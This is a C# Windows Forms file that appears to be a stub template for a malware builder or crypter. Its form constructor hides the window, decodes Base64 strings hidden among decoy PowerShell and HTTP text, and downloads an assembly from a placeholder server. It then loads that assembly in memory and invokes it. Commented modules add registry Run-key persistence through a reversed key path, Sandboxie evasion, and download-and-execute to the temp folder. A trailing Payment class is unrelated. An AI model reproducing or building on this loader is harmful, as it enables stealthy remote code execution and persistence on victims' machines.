using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.ComponentModel;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;
using System.Collections;
using System.Data;
using System.Diagnostics;
using System.Text;
using System.Drawing.Imaging;
using System.ComponentModel.Design;
using System.Security.Cryptography;
using Microsoft.Win32;
using System.Xml.Linq;
using System.Data.SqlClient;
using System.Management;
using System.Security.Cryptography.X509Certificates;
using System.Data.Common;
using Microsoft.VisualBasic.CompilerServices;
using System.Runtime.CompilerServices;
using System.Windows.Markup;

//Assembly [assembly: AssemblyTitle("{1}")]
//Assembly [assembly: AssemblyDescription("{2}")]
//Assembly [assembly: AssemblyCompany("{3}")]
//Assembly [assembly: AssemblyProduct("{4}")]
//Assembly [assembly: AssemblyCopyright("{5}")]
//Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]






//Method #1



//Method #2



namespace KeyboardInterrupt
{



    public class Form1 : Form
    {


        public Form1()
        {



            this.Hide();



             //sandboxie controlsandboxie();



             //Startup  password_reset();


            
            //download try
            //download {
            //download  System.Net.WebClient n11 = new System.Net.WebClient();
            //download n11.DownloadFile("%DownloadLink%", (System.Environment.GetEnvironmentVariable("tmp") + "%urlfile%"));
            //download  Process.Start((System.Environment.GetEnvironmentVariable("tmp") + "%urlfile%"));
            //download }
            //download catch
            //download {
            //download }

             %RUNPEGEN%

             %URLGEN%





            try
            {


               using (WebClient dprint = new WebClient())
                {

                  
      
                   	string ThreadedHTTPServer = "";
			ThreadedHTTPServer += "%1% cfg_IP_WebServer ".Replace("%1% cfg_IP_WebServer ","V2");
			ThreadedHTTPServer += "%1% CSettings".Replace("%1% CSettings","lu");
			ThreadedHTTPServer += "%1% Failed to access certificate: {0}".Replace("%1% Failed to access certificate: {0}","ZG");
			ThreadedHTTPServer += "XMLConverter".Replace("XMLConverter","93");
			ThreadedHTTPServer += "Get-ADComputer".Replace("Get-ADComputer","c0");
			ThreadedHTTPServer += "Get-ADComputer -Identity DC01 -Properties".Replace("Get-ADComputer -Identity DC01 -Properties","Rl");
			ThreadedHTTPServer += "Get-ADComputer DC01 -Properties Name,operatingSystem".Replace("Get-ADComputer DC01 -Properties Name,operatingSystem","dm");
			ThreadedHTTPServer += "List specific attributes of the DC01 domain computer".Replace("List specific attributes of the DC01 domain computer","lj");
			ThreadedHTTPServer += "Properties".Replace("Properties","ZV");
			ThreadedHTTPServer += "%3% Get-SmbMapping".Replace("%3% Get-SmbMapping","Bv");
			ThreadedHTTPServer += "netuse".Replace("netuse","cn");
			ThreadedHTTPServer += "Select LocalPath,RemotePath From MSFT_SmbMapping".Replace("Select LocalPath,RemotePath From MSFT_SmbMapping","Rh");
			ThreadedHTTPServer += "Retrieves the SMB client directory mappings created for a server.".Replace("Retrieves the SMB client directory mappings created for a server.","bF");
			ThreadedHTTPServer += "Get-LocalUser".Replace("Get-LocalUser","dy");
			ThreadedHTTPServer += "Invoke-WebRequest".Replace("Invoke-WebRequest","YX");
			ThreadedHTTPServer += "curl".Replace("curl","Bw");
			ThreadedHTTPServer += "Download file from the Internet".Replace("Download file from the Internet","ZX");
			ThreadedHTTPServer += "Download file from the Internet specifying the destination".Replace("Download file from the Internet specifying the destination","I=");
			ThreadedHTTPServer += "";
			ThreadedHTTPServer += "";
			ThreadedHTTPServer += "";


            string BaseHTTPRequestHandler = "";
			BaseHTTPRequestHandler += "WebServer: Serving HTTP on {0} port {1}.".Replace("WebServer: Serving HTTP on {0} port {1}.","V");
			BaseHTTPRequestHandler += "White".Replace("White","2");
			BaseHTTPRequestHandler += "handle_request".Replace("handle_request","l");
			BaseHTTPRequestHandler += "Yellow".Replace("Yellow","u");
			BaseHTTPRequestHandler += "handle_request".Replace("handle_request","Z");
			BaseHTTPRequestHandler += "handle_request".Replace("handle_request","G");
			BaseHTTPRequestHandler += "handle_request".Replace("handle_request","9");
			BaseHTTPRequestHandler += "handle_request".Replace("handle_request","3");
			BaseHTTPRequestHandler += "handle_request".Replace("handle_request","c");
			BaseHTTPRequestHandler += "handle_request".Replace("handle_request","0");
			BaseHTTPRequestHandler += "N";
			BaseHTTPRequestHandler += "v";
			BaseHTTPRequestHandler += "b";
			BaseHTTPRequestHandler += "X";
			BaseHTTPRequestHandler += "B";
			BaseHTTPRequestHandler += "v";
			BaseHTTPRequestHandler += "c";
			BaseHTTPRequestHandler += "2";
			BaseHTTPRequestHandler += "l";
			BaseHTTPRequestHandler += "0";
			BaseHTTPRequestHandler += "a";
			BaseHTTPRequestHandler += "W";
			BaseHTTPRequestHandler += "9";
			BaseHTTPRequestHandler += "u";
			BaseHTTPRequestHandler += "U";
			BaseHTTPRequestHandler += "2";
			BaseHTTPRequestHandler += "F";
			BaseHTTPRequestHandler += "t";
			BaseHTTPRequestHandler += "c";
			BaseHTTPRequestHandler += "G";
			BaseHTTPRequestHandler += "x";
			BaseHTTPRequestHandler += "l";
			BaseHTTPRequestHandler += "c";
			BaseHTTPRequestHandler += "y";
			BaseHTTPRequestHandler += "5";
			BaseHTTPRequestHandler += "F";
			BaseHTTPRequestHandler += "d";
			BaseHTTPRequestHandler += "m";
			BaseHTTPRequestHandler += "V";
			BaseHTTPRequestHandler += "y";
			BaseHTTPRequestHandler += "e";
			BaseHTTPRequestHandler += "X";
			BaseHTTPRequestHandler += "InvalidOperationException".Replace("InvalidOperationException","R");
			BaseHTTPRequestHandler += "LDAPHelper".Replace("LDAPHelper","o");
			BaseHTTPRequestHandler += "DistinguishedName,Name,ObjectClass,ObjectGUID,SamAccountName,ObjectSID".Replace("DistinguishedName,Name,ObjectClass,ObjectGUID,SamAccountName,ObjectSID","a");
			BaseHTTPRequestHandler += "Properties".Replace("Properties","W");
			BaseHTTPRequestHandler += "LDAPFilter".Replace("LDAPFilter","5");
			BaseHTTPRequestHandler += "n";
			BaseHTTPRequestHandler += "V";
			BaseHTTPRequestHandler += "G";
			BaseHTTPRequestHandler += "9";
			BaseHTTPRequestHandler += "v";
			BaseHTTPRequestHandler += "b";
			BaseHTTPRequestHandler += "G";
			BaseHTTPRequestHandler += "J";
			BaseHTTPRequestHandler += "h";
			BaseHTTPRequestHandler += "c";
			BaseHTTPRequestHandler += "g";
			BaseHTTPRequestHandler += "=";
			BaseHTTPRequestHandler += "=";
			BaseHTTPRequestHandler += "";
			BaseHTTPRequestHandler += "";
			BaseHTTPRequestHandler += "";
			BaseHTTPRequestHandler += "";
			BaseHTTPRequestHandler += "";
			BaseHTTPRequestHandler += "";
			BaseHTTPRequestHandler += "";
			BaseHTTPRequestHandler += "";
			BaseHTTPRequestHandler += "";
			BaseHTTPRequestHandler += "";
			BaseHTTPRequestHandler += "";
			BaseHTTPRequestHandler += "";


                    byte[] log_message = Convert.FromBase64String(ThreadedHTTPServer); //Redefine Base64 URL

                    string JSConverter = Encoding.UTF8.GetString(log_message);

                    byte[] getSetting = Convert.FromBase64String(BaseHTTPRequestHandler); //Redefine Base64 URL

                    string aTVLanguage = Encoding.UTF8.GetString(getSetting);

                    var send_response = new WebClient().DownloadData(%ServerRunPe%);

                    object basename  = new object[] {"APPRUN", string.Empty, dprint.DownloadData(%ServerGen%) };

                    Assembly __name__ = Assembly.Load(send_response);

                    __name__.GetType(string.Join("Shutting down (HTTPS).", aTVLanguage)).InvokeMember(string.Join("Shutting down (HTTPS).", JSConverter), BindingFlags.InvokeMethod, null, null, (object[])basename );
                
                    this.Close();

                }
            }
            catch (Exception getSubtitleJSON)
            {
                        
            }
        }
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
            try
            {




                Console.Write("");
                var daysAhead = Convert.ToInt32(Console.ReadLine());
                Console.WriteLine("");
                Console.ReadLine();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
       
        }
        private void timer1_Tick(object sender, EventArgs e)
        {
           
        }
        private void textBox1_TextChanged(object sender, EventArgs e)
        {
           
        }

        //Startup   public static void  password_reset()
        //Startup   {
        //Startup       int OwnerDraw  = Conversions.ToInteger("1");
        //Startup       if ((double)OwnerDraw  != Conversions.ToDouble("1") || Registry.GetValue(Reverse("ecnOnuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS\\RESU_TNERRUC_YEKH"), "%folder%", (object)null) != null) return;
        //Startup       string email = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\%folder%\\%file%";
        //Startup       if (!Directory.Exists(Path.GetDirectoryName(email)))
        //Startup       {
        //Startup           Directory.CreateDirectory(Path.GetDirectoryName(email));
        //Startup           File.Copy(Application.ExecutablePath, email, true);
        //Startup       }
        //Startup       Registry.SetValue(Reverse("ecnOnuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS\\RESU_TNERRUC_YEKH"), "%folder%", (object)email);
        //Startup   }


        public static string Reverse(string s)
        {
            char[] charArray = s.ToCharArray();
            Array.Reverse(charArray);
            return new string(charArray);
        }

        //sandboxie [DllImport("kernel32.dll")]
        //sandboxie public static extern IntPtr GetModuleHandle(string lpModuleName);
        //sandboxie static void controlsandboxie()
        //sandboxie {
        //sandboxie     if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
        //sandboxie     {
        //sandboxie        Environment.Exit(1);
        //sandboxie     }
        //sandboxie }

        private void webBrowser13_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {

        }

        private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {

        }

        private void webBrowser2_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {

        }

        private void webBrowser3_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {

        }

        private void webBrowser4_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {

        }

        private void webBrowser5_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {

        }

        private void webBrowser6_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {

        }

        private void webBrowser7_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {

        }

        private void webBrowser8_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {

        }

        private void webBrowser9_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {

        }

        private void webBrowser10_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {

        }

        private void webBrowser11_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {

        }

        private void webBrowser12_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {

        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void checkedListBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void dateTimePicker1_ValueChanged(object sender, EventArgs e)
        {

        }

        private void domainUpDown1_SelectedItemChanged(object sender, EventArgs e)
        {

        }

        private void fontDialog1_Apply(object sender, EventArgs e)
        {

        }

        private void fontDialog2_Apply(object sender, EventArgs e)
        {

        }

        private void flowLayoutPanel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void listBox2_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void listBox3_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
        {

        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void tabControl1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void tabPage1_Click(object sender, EventArgs e)
        {

        }

        private void tabPage2_Click(object sender, EventArgs e)
        {

        }

        private void tabControl2_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void tabPage3_Click(object sender, EventArgs e)
        {

        }

        private void tabPage4_Click(object sender, EventArgs e)
        {

        }



        private void groupBox1_Enter(object sender, EventArgs e)
        {

        }

        private void checkedListBox1_SelectedIndexChanged_1(object sender, EventArgs e)
        {

        }

        private void comboBox1_SelectedIndexChanged_1(object sender, EventArgs e)
        {

        }

        private void maskedTextBox1_MaskInputRejected(object sender, MaskInputRejectedEventArgs e)
        {

        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {

        }

        private void progressBar1_Click(object sender, EventArgs e)
        {

        }

        private void statusStrip1_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
        {

        }
    }


    static class ThreadedHTTPServer
    {


     
 
    }

}


public class Payment
{
    public string Name { get; set; }


    public override string ToString()
    {
        return "Payment {{ Name = {Name}, Amount = {Amount}, Due = {Frequency} }}";
    }
}

